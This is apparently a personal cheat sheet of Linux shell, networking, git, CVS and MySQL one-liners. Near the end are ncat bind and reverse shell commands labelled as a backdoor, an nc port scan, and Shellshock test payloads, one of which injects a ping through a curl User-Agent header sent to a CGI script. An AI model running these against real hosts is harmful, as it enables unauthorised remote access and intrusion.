mount -t cifs -o rw,nounix,noserverino,uid=500,gid=500,username=administrator,password=q //192.168.2.20/F$ /mnt/hgfs/F\:
mount /path/to/file.iso /mnt/cdrom -oloop
Mount a .iso file in UNIX/Linux
"-o loop" lets you use a file as a block device


timeout 5s COMMAND
Start COMMAND, and kill it if still running after 5 seconds 


cp /work/{host,target}/phone/ui/main.cpp
cp /work/host/phone/ui/main.cpp !#$:s/host/target
using `!#$' to referance backward-word
cp /work/host/phone/ui/main.cpp /work/target/phone/ui/main.cpp

grep --color=always | less -R
colorized grep in less


find . -type f -newermt "2010-01-01" ! -newermt "2010-06-01"
find files in a date range 
Time specifications are interpreted as for the argument to the -d option of GNU date.  



bind -x '"\C-l":ls -l'
Bind a key with a command
the -x option is for binding to a shell command


echo rm *.txt
rm *.txt <TAB> <TAB>
prevent accidents while using wildcards 
if you're using wildcards * or ? in your command, and if you're deleting, moving multiple files, 
it's always safe to see how those wildcards will expand. 
if you put "echo" in front of your command, the expanded form of your command will be printed. 
It's better safe than sorry.



PROMPT_COMMAND='if [ $RANDOM -le 3200 ]; then printf "\0337\033[%d;%dH\033[4%dm \033[m\0338" $((RANDOM%LINES+1)) $((RANDOM%COLUMNS+1)) $((RANDOM%8)); fi'
April Fools' Day Prank
Add this to a fiend's .bashrc.
PROMPT_COMMAND will run just before a prompt is drawn.
RANDOM will be between 0 and 32768; in this case, it'll run about 1/10th of the time.
\033 is the escape character. I'll call it \e for short.
\e7 -- save cursor position.
\e[%d;%dH -- move cursor to absolute position
\e[4%dm \e[m -- draw a random color at that point
\e8 -- restore position.


echo "foo" > /dev/tcp/192.168.1.2/25
send echo to socket network
this command will send a message to the socket 25 on host 192.168.1.2 in tcp.
works on udp and icmp
understand only IP address, not hostname.
on the other side (192.168.1.2), you can listen to this socket and test if you receive the message.
easy to diagnose a firewall problem or not.


[[ test_condition ]] && if_true_do_this || otherwise_do_that
true && { echo success;} || { echo failed; }
max() { [ "$1" -gt "$2" ] && { echo $1; } || { echo $2; }; }


grep 0 * | tee >(cat a.txt) >(cat b.txt) >(grep -o 4 c.txt)  | grep [[:digit:]]
some_command | tee >(command1) >(command2) >(command3) ... | command4
Use tee + process substitution to split STDOUT to multiple commands
Using process substitution, 
    we can 'trick' tee into sending a command's STDOUT to an arbitrary number of commands. 
The last command (command4) in this example will get its input from the pipe.

hexdump -C -n 10 xxx.txt
cut -b 4- xxx.txt
lsof -i tcp:22
ps aux --sort -rss
ps aux --sort -pcpu
ssh-keygen -t rsa -C "your_email@example.com"


man xxxx | col -bx | sed "s/\xe2\x80\x98/'/g" | sed "s/\xe2\x80\x99/'/g" >xxxx.man

awk '{ $5=""; print }' file
cut -f5 --complement

time lsof | awk '{pid[$2]++} END{for (i in pid) print pid[i] ", " i}' | sort -nr | head
time lsof -F f | awk '{if (/^p/) id=substr($0,2);else pid[id]++;} END{for (i in pid) print pid[i] ", " i}' | sort -nr | head

echo $(($(date --date="2008/09/04" +%s)/86400+1))


regular time
echo '2014-01-25 09:17:17' | grep "[0-9]\{4\}-[0-9]\{2\}-[0-9]\{2\}\s\+[0-9]\{2\}:[0-9]\{2\}:[0-9]\{2\}"


nautilus [OPTION...] [URI...] 
Browse the file system with the file manager
nautilus `pwd`

evince [OPTION...] [FILE…] GNOME Document Viewer
evince man.pdf


cvs status | grep -v "^ " | grep -v "^$" | grep -v = | grep -v "Status: Up-to-date"

not ignore file
cvs update -I ! 

To show the headers of files created after October 1, 2005 and before October 3, 2005:
cvs log -S -d "2005/10/1<2005/10/3"

To show the headers of files in the current directory created after October 1, 2005 through the present time:
cvs log -S -l -d "2005/10/1<now"



man 1 intro - 一篇对从未接触过Linux的用户的简明教程。
man 2 syscalls - 内核系统请求的列表，按内核版本注释分类，系统编程必备。
man 2 select_tut - 关于select()系统请求的教程。
man 3 string - 在头文件内的所有函数。
man 3 stdio - 关于头文件的使用，标准输入/输出库的说明。
man 3 errno - 所有errorno的取值及说明。（C语言内类似其他语言的异常告知机 制）
man 4 console_codes - Linux的终端控制码及其使用解释。
man 4 full - 介绍/dev/full这个总是处于"满"状态的磁盘。（对应/dev/null这个总是 空的设备）
man 5 proc - 介绍/proc下的文件系统。
man 5 filesystems - 各种Linux文件系统。
man 7 bootparam - 详细解释内核启动参数。
man 7 charsets - 解释各种语言的编码集。（gbk，gb2312等）
man 7 glob - 解释glob文件名管理机制的工作过程。
man 7 hier - 解释Linux文件系统结构各个部分的作用。
man 7 operator - C语言的运算符的列表。
man 7 regex - 介绍正则表达式。
man 7 suffixes - 常见文件后缀名的列表跟解释。
man 7 time - Linux的时钟机制解释。
man 7 units - 数值单位及其数值的解释。
man 7 utf8 - 描述UTF-8编码。
man 7 url - 解释URL、URI、URN等的标准。

OUTFILE=`ls -l | grep -v total`
while read line
do
all="$all $line"
echo $line
done <<EOF
$OUTFILE
EOF


${parameter,,pattern}, where parameter is the name of your variable and pattern is ommitted
$ string="Hello, World!"
$ echo $string
Hello, World!
$ echo ${string,,}
hello, world!
The upper-case conversion works with ${parameter^^pattern}
$ echo ${string^^}
HELLO, WORLD!

kill -9 %1

logF() { while read data; do echo "[F:$(date +"%D %T")] $data"; done; }
seq 5 | logF

catecho () {
    if read -t 0; then
        cat
    else
        echo "$*"
    fi
}
$ catecho command line arguments
command line arguments
$ echo "foo bar" | catecho
foo bar


read_from_pipe() { read "$@" <&0; }

ipv4
netstat -anptu --ip

daemon shell
nohup ./myscript 0<&- &> my.admin.log.file &
command &>filename redirects both the stdout and the stderr of command to filename.


ifconfig
vi /etc/sysconfig/network-scripts/ifcfg-eth0


awk '$4~/(^|,)rw($|,)/' /proc/mounts 

route del default gw 192.168.2.1
route add default gw 192.168.2.1

route add -net 10.10.10.0/24 gw 192.168.0.1
route del -net 10.10.10.0/24 gw 192.168.0.1

route add -host 10.10.10.45 gw 192.168.0.1
route del -host 10.10.10.45 gw 192.168.0.1

route del -net 10.1.0.0 netmask 255.255.0.0 gw 10.2.0.1 eth0 
route del -host 10.10.0.5 netmask 255.255.0.0 gw 10.2.0.1 eth0 

ip route flush

tcpdump arp and ether host 00:00:00:00:00:00

tar czf - *.o | ssh root@192.168.2.1 "cd /tmp && tar xzf -"

login user message 
    w
    who
    last
    finger
    pkill -t pts/0

    write 
    wall
    talk
    mesg
    notify-send

uptime


The character % introduces a job specification (jobspec).
jobs
bg
fg
disown [-ar] [-h] [jobspec ...]
    Without options , each jobspec is removed from the table of active jobs.
kill [-s sigspec | -n signum | -sigspec] [pid | jobspec] ...

ifconfig eth0 | grep 'inet addr' | xargs echo | awk -F " |:" '{print $3}'
ifconfig eth0 | grep 'inet addr' | awk -F " +|:" '{print $4}'

gzip -d
gunzip

zip
unzip

xgettext *.c *.sh

echo $line | tr [:upper:] [:lower:]

[root@localhost ~]# echo a b c d | awk 'OFS="-"{ $2="b"; print $0}'
a-b-c-d 
[root@localhost ~]# echo a b c d | awk 'OFS="-"{ print $0}'
a b c d
[eric@eric monitor]$ echo a b c d | awk 'OFS="-"{ $2=$2; print $0}'   
a-b-c-d


date "+%Y-%m-%d %H:%M:%S"
date "+%Y-%m-%d %T"
2014-07-08 19:21:43
echo | awk '{print strftime("%Y-%m-%d %H:%M:%S", mktime("2014 08 01 07 23 59"))}'  
date -d "Tue 08 Jul 2014 07:23:59" "+%Y-%m-%d %H:%M:%S"
echo "Tue Jun 24 15:11:12 2014" | awk '{ cmd="date  \"+%Y-%m-%d %H:%M:%S\" -d \""  $0 "\""; cmd | getline time; close(cmd); print time}'

mysqldump --no-data db_name tb1 tb2 >table.sql
mysql --execute="SELECT VERSION();SELECT NOW()"
mysql --batch --skip-column-name --execute="select count(*) from db.table;"
mysql db_name <file.sql
mysqldump -h HostIp -u UserName -pPassWord  --no-data db_name table_name | mysql db_name
mysql --execute="SELECT VERSION();SELECT NOW()"
select User,Host from mysql.user;
INSERT INTO table1 SELECT *, NOW(), "aaa" FROM table2 WHERE id=1;
SELECT * FROM table ORDER BY alarm_id DESC LIMIT 10 ;
SELECT * FROM table WHERE time > NOW() - INTERVAL 5 MINUTE;
SELECT type, COUNT(type) FROM table WHERE time > (NOW() - INTERVAL 40 MINUTE) GROUP BY type;
SELECT GROUP_CONCAT(id SEPARATOR ',' ) FROM table;
SELECT GROUP_CONCAT( CONCAT( id, ' ', name, ' ', city, ' ', state) SEPARATOR ',')  from table;
show databases;

GRANT ALL PRIVILEGES ON *.* TO admin@localhost IDENTIFIED BY 'something' WITH GRANT OPTION;
GRANT ALL PRIVILEGES ON *.* TO user_name@"%" IDENTIFIED BY 'password' WITH GRANT OPTION;

SELECT column_name(s) FROM table1
UNION
SELECT column_name(s) FROM table2;

path:/var/lib/mysql/
SELECT @@datadir;

SELECT CONCAT('20000',i)
SELECT CONCAT(20000+i)
SELECT CONCAT(20000+i,'')
SELECT CAST(20000+i AS CHAR)


--------------------drop all table----------------------------------------
SET FOREIGN_KEY_CHECKS = 0; 
SET @tables = NULL;
SELECT GROUP_CONCAT(table_schema, '.', table_name) INTO @tables
FROM information_schema.tables 
WHERE table_schema = 'database_name'; -- specify DB name here.

SET @tables = CONCAT('DROP TABLE ', @tables);
PREPARE stmt FROM @tables;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;
SET FOREIGN_KEY_CHECKS = 1; 
------------------------------------------------------------
mysqldump --add-drop-table --no-data  database_name  | grep ^DROP | mysql database_name

select * from table into outfile '/tmp/x.cvs' fields terminated by ',' enclosed by '"' lines terminated by '\n';

select CONCAT(table_schema, '.', table_name) from information_schema.tables;


smbclient //192.168.2.2/share -U root%password

git
     .gitignore
     .git/info/exclude
     .git/config  [core] -> excludesfile = 

git clone https://github.com/zeroflyfire/mcode.git
git config user.email "zero.flyfire@gmail.com"
git config user.name "flyfire"
git push origin master
git branch
git branch -r
git diff origin/master
git fetch origin
git merge origin/master
git rebase origin/master
git reset --hard HEAD~1
git stash
git stash clear
git stash list
git stash pop
git config credential.helper cache
git config remote.origin.url git@github.com:zeroflyfire/mcode.git
git diff --stat --staged origin
git checkout -- Makefile

git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle
git submodule

git diff 012345..abcdef
git diff --cached

git diff 0da94be  59ff30c > my.patch
git apply my.patch

git archive master --format=tar -o xxx.tar


list packages installed
dpkg --get-selections | grep -v deinstall


A=0
awk "{print \$$A}" 1.txt
awk \{print\$$A\} 1.txt
awk '{print $'$A'}' 1.txt
awk '{print $'"$A"'}' 1.txt 


Here strings
cat <<< "hello world.."

Here documents
cat <<EOF
hello world
EOF

ECHO Server:
ncat -v -l -p 5555 -c 'while true; do read i && echo [echo] $i; done'
Client:
ncat -v -t 127.0.0.1 5555

machine A - Send File
cat happy.txt | ncat -v -l -p 5555
machine B - Receive File
ncat localhost 5555 > happy_copy.txt

Port scanning
nc -v -n -z -w 1 192.168.1.2 75-85

Remote Shell/Backdoor
Server:
ncat -v -l -p 7777 -e /bin/bash
ncat -v -l -n -p 8888 -e cmd.exe
Client:
nc localhost 7777

Reverse Shell
machine A
ncat -v -l -p 8888
machine B
ncat A_ip 8888 -e /bin/bash


#!/bin/bash
{ myCode=$(</dev/stdin); } <<EOF
ls
pwd
EOF
echo "$myCode"
eval "$myCode"


while read i; do echo -e "Parameter : $i"; done < <(echo -e "a\nab\nc") 

tar -c -f foo.tar -C /etc passwd hosts -C /lib libc.a

file size
stat -c %s FileName

env x='() { :; }; echo What is Shellshock?' bash -c 'echo Should I worry?'
env x='() { :; }; echo vulnerable' bash -c 'echo this is a test'
curl -A "() { foo;};echo \"Content-type: text/plain\"; ping 192.168.2.172 &" http://192.168.2.180/cgi-bin/poc.cgi }"

Set the Access and Modification times
touch -c -t 201312101730

mount --bind  olddir/ newdir/    #把newdir 作为olddird的一个镜像，它们的内容完全一样

fuser –km /dev/cdrom # busy状态时，卸载该文件系统

script path
SCRIPT_PATH="$( cd $(dirname ${BASH_SOURCE[0]}) && pwd )"

$FUNCNAME[@]
An array variable containing the names of all shell functions currently in the execution call stack.
The element with index 0 is the name of any currently-executing shell function.
The bottom-most element (the one with the highest index) is "main".

timeout 5s COMMAND
Start COMMAND, and kill it if still running after 5 seconds

[root@~]# path="a/b/c"
[root@~]# echo "${path////\/}"
a\/b\/c

ionice -c3 $$; renice +20 -p $$

ip link
ip addr add IP/掩码 dev 网卡名
ip route add default via 192.168.2.1
